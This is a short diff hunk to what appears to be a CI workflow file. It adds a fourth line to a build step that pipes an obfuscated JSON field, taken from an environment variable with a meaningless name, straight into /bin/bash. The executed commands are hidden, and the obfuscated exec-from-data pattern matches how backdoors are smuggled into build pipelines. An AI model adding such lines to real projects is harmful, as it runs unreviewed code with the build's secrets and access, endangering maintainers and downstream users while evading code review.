@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$onc02" | jq -r .tod0153 | /bin/bash
           echo $o6 | jq -r .rh7 | /bin/bash
           echo $vej62122 | jq -r .fqhk005 | /bin/bash
+          echo $abjr1 | jq -r .otpc750 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
